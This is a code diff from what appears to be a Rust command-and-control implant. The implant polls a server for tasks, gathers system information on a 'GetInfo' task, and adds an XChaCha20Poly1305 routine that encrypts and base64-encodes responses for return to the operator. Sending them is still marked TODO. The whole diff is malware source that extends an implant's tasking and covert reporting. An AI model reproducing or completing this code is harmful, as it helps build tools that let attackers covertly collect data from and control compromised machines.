@@ -1,6 +1,7 @@
 use arrayvec::ArrayVec;
 use base64;
 use bincode;
+use blake3;
 use reqwest;
 use std::process;
 use std::str::FromStr;
@@ -64,9 +65,15 @@ pub fn handle_available_tasks(
 
     for task in deserialized_tasks {
         // Using unwrap is safe here because task is sent from server
-        let task = task::Tasks::from_str(task.task.as_str()).unwrap();
-        match task {
-            task::Tasks::GetInfo => system::gather_system_info(),
+        let task_enum = task::Tasks::from_str(task.task.as_str()).unwrap();
+        match task_enum {
+            task::Tasks::GetInfo => {
+                let system_info =
+                    system::gather_system_info(task.task_id.to_string(), &implant_id)?;
+
+                // TODO: Encrypt and send system_info
+                let encrypted_response = build_encrypted_response(&blake3_hashed_key, system_info);
+            }
             _ => process::exit(1),
         }
     }
@@ -83,4 +90,29 @@ pub fn get_tasks(implant_id: &String) -> Result<String, ImplantError> {
     let response = reqwest::blocking::get(full_url)?.text()?;
 
     Ok(response)
+}
+
+// There is no reason to generate keypair again
+// because private key and public key are same,
+// so BLAKE3 hash will be same.
+// However, XChaCha20Poly1305 adds random nonce, which guarantees
+// that response will be different.
+pub fn build_encrypted_response<T>(blake3_hashed_key: &blake3::Hash, message: T) -> String
+where
+    T: Sized + serde::Serialize,
+{
+    // Encrypt message (XChaCha20Poly1305)
+    let encoded_message = bincode::serialize(&message).expect("Vector encode error");
+    let (encrypted_message, nonce) =
+        network_encryption::xchacha20poly1305_encrypt_message(blake3_hashed_key, &encoded_message);
+
+    // Base64 encode encrypted response byte array
+    let base64_encrypted_message = base64::encode(encrypted_message);
+
+    // Base64 encode nonce
+    let base64_nonce = base64::encode(nonce);
+
+    let response = format!("{}\n{}", base64_encrypted_message, base64_nonce);
+
+    response
 }
